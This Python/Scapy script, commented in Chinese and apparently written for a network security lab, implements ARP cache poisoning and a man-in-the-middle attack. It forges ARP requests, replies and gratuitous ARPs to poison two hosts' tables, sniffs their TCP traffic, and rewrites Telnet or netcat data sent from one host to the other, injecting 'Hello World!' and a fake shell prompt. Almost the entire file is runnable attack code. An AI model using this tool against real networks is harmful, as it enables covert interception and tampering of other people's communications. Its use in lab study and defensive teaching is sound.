from scapy.all import *
import os
import time
import threading as th

#这是注释

# 添加一个信号量，保证输出不会混乱
semaphore = th.Semaphore(1)

##################################################################################

def ipconfig():
    '查看网络配置；直接执行cmd命令:iponfig'
    os.system('ipconfig')

def GetHostIP():
    '获得本机IP，(VBox以太网,内网,外网)'
    import socket,requests
    # 1
    hostname = socket.gethostname()
    ip1 = socket.gethostbyname(hostname) #192.168.56.1
    # 2
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    ip2 = s.getsockname()[0] #172.25.144.174
    s.close()
    # 3
    ip3 = requests.get('http://ifconfig.me/ip', timeout=1).text.strip() #222.206.18.145
    return ip1,ip2,ip3

def GetHostMAC():
    hostname = socket.gethostname()
    return get_if_hwaddr(hostname)

def ScanMAC(ipscan):
    '扫描局域网MAC'
    #ipscan='172.25.144.1/24'
    ans,unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ipscan),
                    timeout=2,verbose=False,retry=5)
    for snd,rcv in ans:
        list_mac=rcv.sprintf("%Ether.src% - %ARP.psrc%")
        print(list_mac)
    return

def GetMAC(ip):
    '获得IP对应的MAC地址'
    # srp函数（发送和接收数据包，发送指定ARP请求到指定IP地址,然后从返回的数据中获取目标ip的mac）
    print('正在获取 %s 的MAC地址...' % ip)
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=1, retry=5)
    #　返回从响应数据中获取的MAC地址
    for s,r in responses:
        return r[Ether].src
    return

##################################################################################

def ARP_request(dstIP,srcIP=None):
    'ARP问询报文；广播询问destIP的MAC；伪造自己的IP为srcIP；srcMAC用自己的'
    E = Ether(dst='ff:ff:ff:ff:ff:ff') #广播
    if srcIP == None:
        A = ARP(pdst = dstIP, op=1) #request
    else:
        A = ARP(psrc = srcIP, pdst = dstIP, op=1) #request，并伪造源IP
    pkt = E / A
    sendp(pkt) #用sendp()发送，而不是send()
    return

def ARP_reply(dstMAC,dstIP,srcIP=None):
    'ARP回应报文；单播回应dstMAC的dstIP；伪造自己的IP为srcIP；srcMAC用自己的'
    E = Ether(dst=dstMAC) #单播
    if srcIP == None:
        A = ARP(pdst = dstIP, op=2) #reply
    else:
        A = ARP(psrc = srcIP, pdst = dstIP, op=2) #reply，并伪造源IP
    pkt = E / A
    sendp(pkt) #用sendp()发送，而不是send()
    return

def ARP_gratuitous(srcIP=None):
    '''
    特殊的ARP请求报文；用于更新所有机器的ARP表
    The source and destination IP addresses are the same.
    The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC address.
    No reply is expected.
    '''
    E = Ether(dst='ff:ff:ff:ff:ff:ff') #广播
    if srcIP == None:
        A = ARP(hwdst='ff:ff:ff:ff:ff:ff', op=1) #request
        A.pdst = A.psrc
    else:
        A = ARP(psrc = srcIP, pdst = srcIP, hwdst='ff:ff:ff:ff:ff:ff', op=1) #request，并伪造源IP
    pkt = E / A
    sendp(pkt) #用sendp()发送，而不是send()
    return

def Attack_ARP(host1_ip,host1_mac,host2_ip,host2_mac,method=1):
    'ARP攻击，扰乱ARP表，形成中间人'
    try:
        while True:
            if method == 0: #方法1，分别欺骗两台目的主机
                ARP_request(host1_ip,host2_ip)
                ARP_request(host2_ip,host1_ip)
            if method == 1: #方法2，分别欺骗两台目的主机
                ARP_reply(host1_mac,host1_ip,host2_ip)
                ARP_reply(host2_mac,host2_ip,host1_ip)
            if method == 2: #方法3，广播更新ARP列表
                ARP_gratuitous(host1_ip)
                ARP_gratuitous(host2_ip)
            print('%s 发动一次ARP攻击...' %time.asctime())
            time.sleep(15) #每15秒，发包攻击一下
    except KeyboardInterrupt:
        print('攻击结束')
    finally: #恢复网络配置
        # send(ARP(op=2, psrc=host1_ip, pdst=host2_ip, hwdst="ff:ff:ff:ff:ff:ff", 
        #         hwsrc=host1_mac), count=3) #伪造srcMAC广播
        # send(ARP(op=2, psrc=host2_ip, pdst=host1_ip, hwdst="ff:ff:ff:ff:ff:ff", 
        #         hwsrc=host2_mac), count=3) #伪造srcMAC广播
        # ARP_gratuitous() #广播自己的MAC
        pass
    return

def Sniffer(host1_ip,host2_ip,my_mac):
    '嗅探器；截获主机1和主机2的TCP数据报；篡改主机1发往主机2的数据，另一方向不修改'
    def f(pkt):
        if pkt.src == my_mac: #自己发的伪造包
            return
        print('截获 IP - %s 到 IP - %s 的报文，自 MAC - %s 发往 MAC - %s' 
              %(pkt.payload.src,pkt.payload.dst,pkt.src,pkt.dst))
        pkt2 = SpoofPacket(pkt,host1_ip,host2_ip)
        send(pkt2)
    myfilter = ("tcp and host %s and host %s" % (host1_ip,host2_ip))  #过滤器
    pkt = sniff(filter = myfilter,prn=f)
    return


    ######### Telnet的通信 #########
    # 1. 主控，按一个字符，立刻TCP发送给被控
    # 2. 被控，返回一个包，回显内容
    # 3. 主控，发送一个ACK包
    ## 4. 如果主控回车(\r\n)，被控发送指令结果，主控发送ACK包
    ## 5. 被控发送提示符，主控发送ACK
    ######### netcat的通信 #########
    # 1. 主控，输入命令，回车(\n)，发送全部字符
    # 2. 被控，Push第一个字符，主控ACK
    # 3. 被控，回显剩余命令字符，主控ACK
    # 4. 被控，发送命令结果，主控ACK
    # 5. 被控，发送提示符，主控ACK
def SpoofPacket(pkt,host1_ip,host2_ip):
    '伪造数据包'
    if pkt[IP].src == host1_ip: #主机1发往主机2的包，修改内容
        if len(pkt[TCP])<=34: #32+0/1/2, 这是自动回复的命令字符，回显
            print('截获发往 %s 的数据：%s' % (host2_ip, pkt[TCP].payload))
            return pkt[IP]
        else:
            newpkt = pkt[IP]
            newpkt.chksum=None #令它计算校验和
            newpkt[TCP].chksum=None
            print('截获发往 %s 的数据：%s' % (host2_ip, pkt[TCP].payload))
            #pkt[IP].len = None # 假的IP的totallen不对！！！ 需要置为None才会自动再次计算
            datalen = pkt[IP].len - 52 # 52=32(TCP)+20(IP)
            if datalen>=34:
                newdata = 'Hello World!'+' '*(datalen-34) + '\r\n[20/10/13]seed@VM:~$' #用\x0d\x0a来换行
            elif datalen>=22:
                newdata = ' '*(datalen-22) + '\r\n[20/10/13]seed@VM:~$' #用\x0d\x0a来换行
            else:
                newdata = 'z'*datalen
            #保证长度一样，TCP序列要顺序，否则会无限重发！
            print('伪造并发送给 %s 数据：%s' % (host2_ip, newdata))
            del(newpkt[TCP].payload) #在此删除数据，然后加入伪造数据
            return newpkt/newdata
    elif pkt[IP].src == host2_ip: #主机2发往主机1的包，不改动。这是主机2发送的命令
        if pkt[TCP].payload!=None and len(pkt[TCP].payload)>0:
            print('截获发往 %s 的数据：%s' % (host1_ip, pkt[TCP].payload))
        return pkt[IP]
    return

def Attack_MITM(host1_ip,host2_ip,my_mac,method):
    '中间人攻击, ManInTheMiddleAttack'
    host1_mac = GetMAC(host1_ip)
    host2_mac = GetMAC(host2_ip)
    # daemon=True,设置守护线程。进程跟随主线程，不等待子线程结束
    a = th.Thread(target=Attack_ARP,args=(host1_ip,host1_mac,host2_ip,host2_mac,method),daemon=True)
    a.start()
    time.sleep(1)
    b = th.Thread(target=Sniffer,args=(host1_ip,host2_ip,my_mac),daemon=True)
    b.start()
    try:
        while 1:
            input('Input Ctrl-C to end...\n')
    except KeyboardInterrupt: #恢复网络配置
        send(ARP(op=2, psrc=host1_ip, pdst=host2_ip, hwdst="ff:ff:ff:ff:ff:ff", 
                hwsrc=host1_mac), count=5) #伪造srcMAC广播
        send(ARP(op=2, psrc=host2_ip, pdst=host1_ip, hwdst="ff:ff:ff:ff:ff:ff", 
                hwsrc=host2_mac), count=5) #伪造srcMAC广播
        ARP_gratuitous() #广播自己的MAC
    return




##################################################################################
if __name__ == '__main__':

    #IP = GetHostIP()
    #MAC = GetHostMAC()
    ipconfig()

    host1_ip = '10.0.2.5'
    host2_ip = '10.0.2.6'
    my_mac = '08:00:27:71:b6:4e'
    method = 0
    
    Attack_MITM(host1_ip,host2_ip,my_mac,method)

    #os.system('pause') #按任意键结束进程
    #input('Input Enter to end...\n')
    # try:
    #     while 1:
    #         input('Input Ctrl-C to end...\n')
    # except KeyboardInterrupt:
    #     pass



    
